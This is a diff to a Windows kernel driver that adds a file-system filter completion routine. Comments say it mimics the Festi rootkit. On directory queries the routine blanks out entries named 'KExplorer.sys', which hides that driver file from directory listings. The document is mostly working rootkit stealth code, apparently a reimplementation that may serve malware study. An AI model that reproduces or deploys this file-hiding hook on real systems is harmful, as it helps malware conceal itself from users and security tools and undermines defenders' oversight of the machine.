@@ -67,6 +67,97 @@ DriverEntry(
 
 }
 
+/* the device extension */
+struct SysRootExtension
+{
+	PDEVICE_OBJECT OwnDevice;
+	PDEVICE_OBJECT LowerDevice;
+	ULONG WhichDevice;  /* just here to mimic festi, otherwise it's useless */
+};
+
+NTSTATUS
+SystemRootHookCompletionRoutine(
+	PDEVICE_OBJECT Device,
+	PIRP Irp,
+	PEPROCESS Process
+)
+{
+	auto Extension = (SysRootExtension*) Device->DeviceExtension;
+	auto Stack = IoGetCurrentIrpStackLocation(Irp);
+	
+	if (KeGetCurrentIrql() == PASSIVE_LEVEL)
+	{
+		if (Extension->WhichDevice == 1 &&
+			Stack->MajorFunction == IRP_MJ_DIRECTORY_CONTROL &&
+			Stack->MinorFunction == IRP_MN_QUERY_DIRECTORY &&
+			Process != nullptr)
+		{
+			KAPC_STATE ApcState;
+			KeStackAttachProcess((PRKPROCESS) Process, &ApcState);
+
+			switch (Stack->Parameters.QueryDirectory.FileInformationClass)
+			{
+				case FileBothDirectoryInformation:
+				{
+					if (!Irp->IoStatus.Information || !Irp->UserBuffer)
+					{
+						break;
+					}
+					auto FileInfo = (PFILE_BOTH_DIR_INFORMATION) Irp->UserBuffer;
+					while (FileInfo->NextEntryOffset)
+					{
+						if (wcsistr(FileInfo->FileName,
+									FileInfo->FileNameLength,
+									L"KExplorer.sys"))
+						{
+							memset(FileInfo->FileName, 0, FileInfo->FileNameLength);
+						}
+						FileInfo = (PFILE_BOTH_DIR_INFORMATION) ((ULONG_PTR) FileInfo + FileInfo->NextEntryOffset);
+					}
+
+				} break;
+
+				case FileIdBothDirectoryInformation:
+				{
+					if (!Irp->IoStatus.Information || !Irp->UserBuffer)
+					{
+						break;
+					}
+					auto FileIdInfo = (PFILE_ID_BOTH_DIR_INFORMATION) Irp->UserBuffer;
+					while (FileIdInfo->NextEntryOffset)
+					{
+						if (wcsistr(FileIdInfo->FileName,
+									FileIdInfo->FileNameLength,
+									L"KExplorer.sys"))
+						{
+							memset(FileIdInfo->FileName, 0, FileIdInfo->FileNameLength);
+						}
+						FileIdInfo = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG_PTR) FileIdInfo + FileIdInfo->NextEntryOffset);
+					}
+				} break;
+
+				default: break;
+			}
+			
+			KeUnstackDetachProcess(&ApcState);
+		}
+		
+	}
+	/* 
+		don't really need to implement this, since this is aimed at
+	   	the network device Festi creates; maybe I'll add it later as well
+	*/
+	if (Extension->WhichDevice == 2)
+	{
+		/* ... */
+	}
+
+	if (Irp->PendingReturned)
+	{
+		Stack->Control |= SL_PENDING_RETURNED;
+	}
+	return STATUS_SUCCESS;
+}
 
 NTSTATUS
 InitiailzeHook()
@@ -151,7 +242,7 @@ InitiailzeHook()
 	Extension->WhichDevice = 1ul;
 	Status = IoAttachDeviceToDeviceStackSafe(DeviceObj, 
 						 TargetDevice, 
-						 &Extension->AttachedDevice);
+						 &Extension->LowerDevice);
 	if (!NT_SUCCESS(Status))
 	{
 		Extension->OwnDevice = nullptr;
@@ -188,7 +279,7 @@ InitiailzeHook()
 				}
 			}
 			IoSkipCurrentIrpStackLocation(Irp);
-			return IoCallDriver(Extension->AttachedDevice, Irp);
+			return IoCallDriver(Extension->LowerDevice, Irp);
 		};
 	}
 
@@ -200,7 +291,7 @@ InitiailzeHook()
 		                       (PIO_COMPLETION_ROUTINE) SystemRootHookCompletionRoutine,
 				       IoGetCurrentProcess(),
 				       TRUE, TRUE, FALSE);
-		return IoCallDriver(((SysRootExtension*) DeviceObj->DeviceExtension)->AttachedDevice,
+		return IoCallDriver(((SysRootExtension*) DeviceObj->DeviceExtension)->LowerDevice,
 		                    Irp);
 
 	};
